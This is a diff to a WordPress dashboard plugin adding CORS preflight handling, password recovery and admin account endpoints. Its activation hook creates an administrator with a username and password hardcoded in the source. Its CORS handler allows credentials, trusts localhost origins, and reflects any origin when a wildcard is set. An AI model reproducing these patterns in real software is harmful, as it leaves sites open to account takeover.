@@ -38,7 +38,36 @@ class Akotarh_Insights {
         add_action('admin_enqueue_scripts', [$this, 'admin_styles']);
         add_filter('rest_pre_serve_request', [$this, 'add_cors_headers'], 10, 4);
 
+        // Handle CORS preflight OPTIONS requests
+        add_action('rest_api_init', function () {
+            remove_filter('rest_pre_serve_request', 'rest_send_cors_headers');
+        }, 15);
+        add_action('init', [$this, 'handle_preflight']);
+
         register_activation_hook(__FILE__, [$this, 'activate']);
+    }
+
+    public function handle_preflight() {
+        if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS' && isset($_SERVER['HTTP_ACCESS_CONTROL_REQUEST_METHOD'])) {
+            $origin  = isset($_SERVER['HTTP_ORIGIN']) ? $_SERVER['HTTP_ORIGIN'] : '';
+            $allowed = get_option('ako_insights_site_url', 'https://akotarhakoson.com');
+            $allowed_origins = array_map('trim', explode(',', $allowed));
+            $allowed_origins[] = 'http://localhost:8091';
+            $allowed_origins[] = 'http://localhost:3000';
+
+            if (in_array($origin, $allowed_origins, true) || in_array('*', $allowed_origins, true)) {
+                header('Access-Control-Allow-Origin: ' . esc_url_raw($origin));
+            } else {
+                header('Access-Control-Allow-Origin: ' . esc_url_raw($allowed_origins[0]));
+            }
+            header('Access-Control-Allow-Methods: GET, POST, PUT, PATCH, DELETE, OPTIONS');
+            header('Access-Control-Allow-Headers: Content-Type, Authorization');
+            header('Access-Control-Allow-Credentials: true');
+            header('Access-Control-Max-Age: 86400');
+            header('Content-Length: 0');
+            header('Content-Type: text/plain');
+            exit;
+        }
     }
 
     /* ═══════════════════════════════════════
@@ -57,6 +86,28 @@ class Akotarh_Insights {
         // Generate JWT secret on first activation
         if (!get_option('ako_jwt_secret')) {
             update_option('ako_jwt_secret', wp_generate_password(64, true, true));
+        }
+
+        // Create default dashboard admin if no admin exists yet
+        if (!get_option('ako_default_admin_created')) {
+            $admin_username = 'akotarh';
+            $admin_password = 'AkoAdmin2025!';
+            $admin_email    = 'contact@akotarhakoson.com';
+
+            if (!username_exists($admin_username) && !email_exists($admin_email)) {
+                $user_id = wp_create_user($admin_username, $admin_password, $admin_email);
+                if (!is_wp_error($user_id)) {
+                    $user = new WP_User($user_id);
+                    $user->set_role('administrator');
+                    wp_update_user([
+                        'ID'           => $user_id,
+                        'display_name' => 'Akotarh Akoson',
+                        'first_name'   => 'Akotarh',
+                        'last_name'    => 'Akoson',
+                    ]);
+                }
+            }
+            update_option('ako_default_admin_created', true);
         }
     }
 
@@ -162,6 +213,37 @@ class Akotarh_Insights {
             'methods'             => 'GET',
             'callback'            => [$this, 'handle_verify'],
             'permission_callback' => '__return_true',
+        ]);
+
+        register_rest_route('akotarh/v1', '/auth/forgot-password', [
+            'methods'             => 'POST',
+            'callback'            => [$this, 'handle_forgot_password'],
+            'permission_callback' => '__return_true',
+        ]);
+
+        // ── ADMIN ACCOUNT ──
+        register_rest_route('akotarh/v1', '/admin/account', [
+            'methods'             => 'GET',
+            'callback'            => [$this, 'admin_get_account'],
+            'permission_callback' => [$this, 'check_auth'],
+        ]);
+
+        register_rest_route('akotarh/v1', '/admin/account/password', [
+            'methods'             => 'PUT',
+            'callback'            => [$this, 'admin_change_password'],
+            'permission_callback' => [$this, 'check_auth'],
+        ]);
+
+        register_rest_route('akotarh/v1', '/admin/account/email', [
+            'methods'             => 'PUT',
+            'callback'            => [$this, 'admin_change_email'],
+            'permission_callback' => [$this, 'check_auth'],
+        ]);
+
+        register_rest_route('akotarh/v1', '/admin/account/profile', [
+            'methods'             => 'PUT',
+            'callback'            => [$this, 'admin_update_profile'],
+            'permission_callback' => [$this, 'check_auth'],
         ]);
 
         // ── ADMIN INSIGHT CRUD ──
@@ -356,6 +438,179 @@ class Akotarh_Insights {
                 'display_name' => $user->display_name,
                 'email'        => $user->user_email,
                 'avatar'       => get_avatar_url($user->ID, ['size' => 96]),
+            ],
+        ], 200);
+    }
+
+    /* ═══════════════════════════════════════
+       PASSWORD RECOVERY
+       ═══════════════════════════════════════ */
+
+    public function handle_forgot_password($request) {
+        $params = $request->get_json_params();
+        $email  = sanitize_email($params['email'] ?? '');
+
+        if (empty($email) || !is_email($email)) {
+            return new WP_Error('invalid_email', 'A valid email address is required', ['status' => 400]);
+        }
+
+        $user = get_user_by('email', $email);
+
+        // Always return success to prevent email enumeration
+        $response = ['message' => 'If an account exists with that email, a password reset link has been sent.'];
+
+        if (!$user) {
+            return new WP_REST_Response($response, 200);
+        }
+
+        // Use WordPress built-in password reset
+        $reset_key = get_password_reset_key($user);
+        if (is_wp_error($reset_key)) {
+            return new WP_REST_Response($response, 200);
+        }
+
+        $reset_url = network_site_url("wp-login.php?action=rp&key=$reset_key&login=" . rawurlencode($user->user_login), 'login');
+        $site_name = wp_specialchars_decode(get_option('blogname'), ENT_QUOTES);
+
+        $message  = "Hello " . $user->display_name . ",\n\n";
+        $message .= "Someone requested a password reset for your Akotarh Dashboard account.\n\n";
+        $message .= "If this was you, click the link below to set a new password:\n\n";
+        $message .= $reset_url . "\n\n";
+        $message .= "This link will expire in 24 hours.\n\n";
+        $message .= "If you did not request this, you can safely ignore this email.\n\n";
+        $message .= "— Akotarh Insights Dashboard";
+
+        $headers = ['Content-Type: text/plain; charset=UTF-8'];
+
+        wp_mail(
+            $user->user_email,
+            '[' . $site_name . '] Password Reset Request',
+            $message,
+            $headers
+        );
+
+        return new WP_REST_Response($response, 200);
+    }
+
+    /* ═══════════════════════════════════════
+       ADMIN ACCOUNT MANAGEMENT
+       ═══════════════════════════════════════ */
+
+    public function admin_get_account($request) {
+        $user = wp_get_current_user();
+        return new WP_REST_Response([
+            'id'           => $user->ID,
+            'username'     => $user->user_login,
+            'display_name' => $user->display_name,
+            'first_name'   => $user->first_name,
+            'last_name'    => $user->last_name,
+            'email'        => $user->user_email,
+            'avatar'       => get_avatar_url($user->ID, ['size' => 96]),
+            'registered'   => $user->user_registered,
+            'role'         => implode(', ', $user->roles),
+        ], 200);
+    }
+
+    public function admin_change_password($request) {
+        $params       = $request->get_json_params();
+        $current_pass = $params['current_password'] ?? '';
+        $new_pass     = $params['new_password'] ?? '';
+
+        if (empty($current_pass) || empty($new_pass)) {
+            return new WP_Error('missing_fields', 'Current password and new password are required', ['status' => 400]);
+        }
+
+        if (strlen($new_pass) < 8) {
+            return new WP_Error('weak_password', 'New password must be at least 8 characters', ['status' => 400]);
+        }
+
+        $user = wp_get_current_user();
+
+        // Verify current password
+        if (!wp_check_password($current_pass, $user->user_pass, $user->ID)) {
+            return new WP_Error('wrong_password', 'Current password is incorrect', ['status' => 401]);
+        }
+
+        // Update password
+        wp_set_password($new_pass, $user->ID);
+
+        // Generate new token since password change invalidates sessions
+        $new_token = $this->generate_jwt($user->ID);
+
+        return new WP_REST_Response([
+            'message' => 'Password updated successfully',
+            'token'   => $new_token,
+        ], 200);
+    }
+
+    public function admin_change_email($request) {
+        $params    = $request->get_json_params();
+        $new_email = sanitize_email($params['email'] ?? '');
+        $password  = $params['password'] ?? '';
+
+        if (empty($new_email) || !is_email($new_email)) {
+            return new WP_Error('invalid_email', 'A valid email address is required', ['status' => 400]);
+        }
+
+        if (empty($password)) {
+            return new WP_Error('missing_password', 'Password is required to change email', ['status' => 400]);
+        }
+
+        $user = wp_get_current_user();
+
+        // Verify password
+        if (!wp_check_password($password, $user->user_pass, $user->ID)) {
+            return new WP_Error('wrong_password', 'Password is incorrect', ['status' => 401]);
+        }
+
+        // Check if email already in use
+        $existing = email_exists($new_email);
+        if ($existing && $existing !== $user->ID) {
+            return new WP_Error('email_exists', 'This email is already associated with another account', ['status' => 409]);
+        }
+
+        wp_update_user([
+            'ID'         => $user->ID,
+            'user_email' => $new_email,
+        ]);
+
+        return new WP_REST_Response([
+            'message' => 'Email updated successfully',
+            'email'   => $new_email,
+        ], 200);
+    }
+
+    public function admin_update_profile($request) {
+        $params = $request->get_json_params();
+        $user   = wp_get_current_user();
+
+        $update_data = ['ID' => $user->ID];
+
+        if (isset($params['display_name'])) {
+            $update_data['display_name'] = sanitize_text_field($params['display_name']);
+        }
+        if (isset($params['first_name'])) {
+            $update_data['first_name'] = sanitize_text_field($params['first_name']);
+        }
+        if (isset($params['last_name'])) {
+            $update_data['last_name'] = sanitize_text_field($params['last_name']);
+        }
+
+        $result = wp_update_user($update_data);
+        if (is_wp_error($result)) {
+            return $result;
+        }
+
+        $updated_user = get_user_by('id', $user->ID);
+        return new WP_REST_Response([
+            'message' => 'Profile updated successfully',
+            'user'    => [
+                'id'           => $updated_user->ID,
+                'display_name' => $updated_user->display_name,
+                'first_name'   => $updated_user->first_name,
+                'last_name'    => $updated_user->last_name,
+                'email'        => $updated_user->user_email,
+                'avatar'       => get_avatar_url($updated_user->ID, ['size' => 96]),
             ],
         ], 200);
     }
